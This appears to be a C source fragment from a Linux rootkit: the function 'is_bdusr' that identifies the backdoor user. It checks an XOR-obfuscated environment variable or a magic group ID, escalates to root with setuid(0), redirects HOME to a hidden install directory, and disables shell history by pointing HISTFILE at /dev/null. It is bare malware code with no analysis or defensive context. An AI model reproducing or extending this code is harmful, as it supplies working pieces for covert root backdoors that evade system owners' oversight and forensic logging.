int is_bdusr(void)
{
    int obd=0;
    char *bdenv=strdup(BD_ENV); xor(bdenv);
    if((getenv(bdenv) != NULL && getuid() == 0) || getgid() == MGID)
    {
        setuid(0);
#ifndef BHOME
        // putenv install dir as home,
        // putenv hist file location (presum. /dev/null)
        char _idir[256], *idir=strdup(IDIR); xor(idir);
        snprintf(_idir, sizeof(_idir), "HOME=%s", idir);
        putenv(_idir); CLEAN(idir);

        putenv("HISTFILE=/dev/null");
#define BHOME
#endif
        obd=1;
    }
    CLEAN(bdenv);
    return obd;
}
